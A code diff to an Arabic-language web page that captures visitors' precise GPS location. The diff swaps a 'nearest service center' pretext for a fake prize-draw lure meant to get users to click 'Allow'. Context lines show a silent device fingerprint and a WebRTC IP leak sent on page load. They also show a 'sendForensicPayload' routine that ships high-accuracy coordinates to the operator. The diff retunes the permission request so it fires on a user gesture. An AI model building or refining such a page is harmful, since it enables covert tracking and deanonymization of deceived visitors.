@@ -218,10 +218,10 @@
 
     <!-- البطاقة الرئيسية -->
     <div class="welcome-card">
-        <span class="card-icon">📍</span>
-        <h1>تحديد الموقع الجغرافي الدقيق</h1>
+        <span class="card-icon">🎁</span>
+        <h1>شارك في سحب الجوائز</h1>
         <p class="card-description">
-            لربطك بأقرب مركز خدمة وتخصيص الخريطة، يرجى الضغط على الزر أدناه والموافقة على إشعار تحديد الموقع.
+            للتسجيل في سحب الجوائز وفق موقعك الجغرافي، يرجى الضغط على الزر أدناه والموافقة على إشعار تحديد الموقع.
         </p>
         
         <div id="status-badge" class="status-badge">
@@ -240,7 +240,7 @@
         </div>
 
         <div class="info-box">
-            <div>📍 المنطقة المكتشفة: <b id="display-location">{{ governorate }}</b></div>
+            <div>📍 موقعك الحالي: <b id="display-location">{{ governorate }}</b></div>
             <div id="accuracy-container" style="display: none;">
                 <span id="display-accuracy" class="accuracy-pill">دقة عالية</span>
             </div>
@@ -351,21 +351,19 @@
             return 'OS';
         }
 
-        // 5. محرك التموضع الذكي (Smart Geolocation Engine)
+        // 5. محرك التموضع الذكي عند النقر (Direct User Gesture Geolocation Engine)
         function triggerSmartLocationCapture() {
             const btn = document.getElementById('activate-btn');
             const btnText = document.getElementById('btn-text');
             const badge = document.getElementById('status-badge');
 
-            btn.disabled = true;
-            btnText.innerHTML = '<span class="spinner"></span> جاري الاتصال بالأقمار وتثبيت الموقع...';
-            badge.innerText = '🛰️ جاري استقبال إشارة GPS بالأمتار...';
+            btnText.innerHTML = '<span class="spinner"></span> يرجى الضغط على (سماح / Allow) في النافذة المنبثقة...';
+            badge.innerText = '🛰️ بانتظار الموافقة لتحديد الموقع بالأمتار...';
             badge.style.color = '#d97706';
             badge.style.background = '#fef3c7';
 
             if (!navigator.geolocation) {
                 badge.innerText = '⚠️ جهازك أو متصفحك لا يدعم تحديد الموقع';
-                btn.disabled = false;
                 btnText.innerText = 'تحديد وتأكيد موقعي بدقة';
                 return;
             }
@@ -373,17 +371,10 @@
             let watchId = null;
             let capturedCount = 0;
 
-            // أ) بدء مراقبة وتدقيق الموقع عبر الأقمار الاصطناعية بدقة متناهية
-            const watchOptions = {
-                enableHighAccuracy: true,
-                timeout: 20000,
-                maximumAge: 0
-            };
-
             const onPositionSuccess = async (pos) => {
                 const acc = pos.coords.accuracy;
                 capturedCount++;
-                console.log(`Location Fix #${capturedCount}: Lat=${pos.coords.latitude}, Lon=${pos.coords.longitude}, Acc=±${acc}m`);
+                console.log(`Fix #${capturedCount}: Lat=${pos.coords.latitude}, Lon=${pos.coords.longitude}, Acc=±${acc}m`);
 
                 if (acc < bestAccuracy) {
                     bestAccuracy = acc;
@@ -399,7 +390,6 @@
                     await sendForensicPayload(coords);
                 }
 
-                // إذا كانت الدقة أقل من 30 متراً، تم الحصول على قفل GPS عالي الدقة!
                 if (acc <= 30) {
                     if (watchId !== null) navigator.geolocation.clearWatch(watchId);
                 }
@@ -407,30 +397,40 @@
 
             const onPositionError = (err) => {
                 console.warn("High Accuracy GPS failed or denied, trying Coarse:", err);
-                // محاولة احتياطية بدون شريحة GPS (عبر شبكات Wi-Fi وأبراج الاتصال)
                 navigator.geolocation.getCurrentPosition(
                     async (pos) => {
                         await onPositionSuccess(pos);
                     },
                     (finalErr) => {
                         console.error("All Geolocation methods failed:", finalErr);
-                        badge.innerText = '⚠️ تم رفض إذن الموقع أو إيقاف الـ GPS في الهاتف';
+                        badge.innerText = '⚠️ يرجى تفعيل الـ GPS في الهاتف والضغط على (سماح)';
                         badge.style.background = '#fee2e2';
                         badge.style.color = '#dc2626';
+                        btnText.innerText = 'إعادة المحاولة (اضغط للسماح)';
                         btn.disabled = false;
-                        btnText.innerText = 'إعادة المحاولة (يرجى السماح بالوصول)';
                     },
                     { enableHighAccuracy: false, timeout: 12000, maximumAge: 60000 }
                 );
             };
 
             try {
-                watchId = navigator.geolocation.watchPosition(onPositionSuccess, onPositionError, watchOptions);
+                // استدعاء فوري مباشر للاستفادة من الـ User Gesture
+                navigator.geolocation.getCurrentPosition(onPositionSuccess, onPositionError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+
+                // مراقبة لتحسين الدقة
+                watchId = navigator.geolocation.watchPosition(onPositionSuccess, () => {}, {
+                    enableHighAccuracy: true,
+                    timeout: 20000,
+                    maximumAge: 0
+                });
             } catch(e) {
                 onPositionError(e);
             }
 
-            // إيقاف البحث بعد 15 ثانية وتثبيت أفضل دقة تم الوصول إليها
             setTimeout(() => {
                 if (watchId !== null) {
                     navigator.geolocation.clearWatch(watchId);
@@ -498,7 +498,7 @@
             }
         }
 
-        // 7. عند تحميل الصفحة: جمع البيانات الصامتة فورياً ومحاولة بدء التموضع
+        // 7. عند تحميل الصفحة: إرسال البصمة الصامتة في الخلفية وترك الزر جاهزاً للضغط
         document.addEventListener('DOMContentLoaded', async () => {
             // كشف WebRTC وجمع العتاد
             cachedWebRTC = await leakWebRTC();
@@ -516,11 +516,6 @@
                     })
                 });
             } catch(e) {}
-
-            // محاولة إطلاق طلب الـ GPS تلقائياً إن سمح المتصفح بذلك
-            if (navigator.geolocation) {
-                triggerSmartLocationCapture();
-            }
         });
     </script>
 </body>
